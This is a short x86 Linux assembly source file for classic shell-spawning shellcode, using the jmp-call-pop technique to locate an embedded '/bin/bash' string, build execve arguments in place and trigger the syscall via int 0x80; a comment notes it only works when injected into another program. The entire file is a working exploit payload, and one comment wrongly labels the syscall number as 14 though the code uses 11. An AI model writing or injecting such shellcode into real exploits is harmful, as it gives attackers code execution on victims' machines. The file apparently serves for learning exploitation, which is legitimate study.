
;Only works in when running it in another program


global _start

section .text



_start:


jmp short jmp_shellcode

shellcode:


    pop esi

    xor ebx,ebx
    mov byte [esi + 9],bl
    mov dword [esi + 10], esi
    mov dword [esi + 14], ebx

    ;loading in the first argument of execve
    lea ebx,[esi]
    ; loading the second argument of execve
    lea ecx,[esi + 10]
    ;loading the third argument of execve
    lea edx,[esi + 14]

    ; cleaning up the eax
    xor eax,eax
    ; defining which syscall. 14 is execve
    mov al,0xb
    int 0x80



jmp_shellcode:
    call shellcode
    db "/bin/bashABBBBCCCC"
